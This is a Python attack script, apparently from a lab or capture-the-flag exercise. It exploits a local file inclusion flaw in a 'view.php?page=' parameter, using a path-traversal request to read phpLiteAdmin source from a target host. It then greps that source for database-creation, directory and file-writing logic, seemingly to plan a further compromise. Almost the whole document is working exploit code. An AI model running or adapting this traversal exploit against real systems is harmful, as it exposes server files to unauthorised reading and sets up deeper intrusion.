#!/usr/bin/env python3
"""Read phpLiteAdmin source via LFI to understand DB creation logic"""
import requests
import re

s = requests.Session()
s.headers['User-Agent'] = 'Mozilla/5.0'
s.timeout = 15
BASE = 'http://192.168.18.132'

# Read the full phpLiteAdmin source
r = s.get(f'{BASE}/view.php?page=../../../var/www/dbadmin/test_db.php', timeout=10)
source = r.text
print(f'Source length: {len(source)} bytes')

# Find newdb/database creation logic
print('\n=== newdb/proc_newdb logic ===')
idx = source.find('newdb')
while idx >= 0:
    context = source[max(0,idx-50):idx+300]
    # Clean HTML tags
    clean = re.sub(r'<[^>]+>', '', context)
    if 'function' in clean.lower() or 'proc' in clean.lower() or 'directory' in clean.lower():
        print(f'  ...{clean[:350]}')
        print()
    idx = source.find('newdb', idx+5)
    if idx < 0:
        break

# Find directory-related code
print('=== directory-related code ===')
idx = source.find('$directory')
while idx >= 0:
    context = source[max(0,idx-30):idx+200]
    clean = re.sub(r'<[^>]+>', '', context)
    print(f'  ...{clean[:250]}')
    print()
    idx = source.find('$directory', idx+10)
    if idx < 0:
        break

# Find the actual PHP file creation
print('=== file creation ===')
for pattern in ['fopen', 'file_put_contents', 'sqlite', 'new PDO', 'touch', 'chmod']:
    idx = source.find(pattern)
    if idx >= 0:
        context = source[max(0,idx-30):idx+200]
        clean = re.sub(r'<[^>]+>', '', context)
        print(f'  {pattern}: ...{clean[:250]}')
        print()
